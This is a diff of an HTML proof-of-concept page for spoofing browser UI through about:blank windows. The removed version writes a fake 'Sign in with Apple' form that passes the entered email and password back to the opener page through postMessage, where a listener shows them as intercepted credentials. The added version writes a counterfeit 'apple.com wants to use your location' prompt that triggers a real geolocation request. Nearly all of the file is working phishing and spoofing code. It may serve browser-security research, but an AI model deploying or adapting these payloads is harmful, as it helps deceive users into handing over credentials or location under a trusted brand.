@@ -1,24 +1,18 @@
 <html>
-<head><title>SSO Spoof via about:blank</title></head>
+<head><title>Prompt Hijack</title></head>
 <body>
-  <button onclick="runSSOSpoof()">Open Fake Apple SSO</button>
+  <button onclick="spoofAndPrompt()">Open Secure Page</button>
   <script>
-    function runSSOSpoof() {
-      const ssoHTML = `
+    function spoofAndPrompt() {
+      const spoofUI = `
         <html><body style='font-family:-apple-system;'>
-        <h2>🔐 Sign in with Apple</h2>
-        <form onsubmit=\"window.opener.postMessage({email:email.value,password:pw.value},'*');return false;\">
-          <input id='email' placeholder='Apple ID' style='width:100%'><br>
-          <input id='pw' type='password' placeholder='Password' style='width:100%'><br>
-          <button type='submit'>Continue</button>
-        </form></body></html>
+        <h2>apple.com wants to use your location</h2>
+        <button onclick=\"navigator.geolocation.getCurrentPosition(()=>alert('Thanks!'))\">Allow</button>
+        </body></html>
       `;
-      const win = window.open("about:blank", "sso");
-      win.document.write(ssoHTML);
+      const win = window.open('about:blank');
+      win.document.write(spoofUI);
     }
-    window.addEventListener("message", e => {
-      alert("Intercepted credentials: " + JSON.stringify(e.data));
-    });
   </script>
 </body>
 </html>
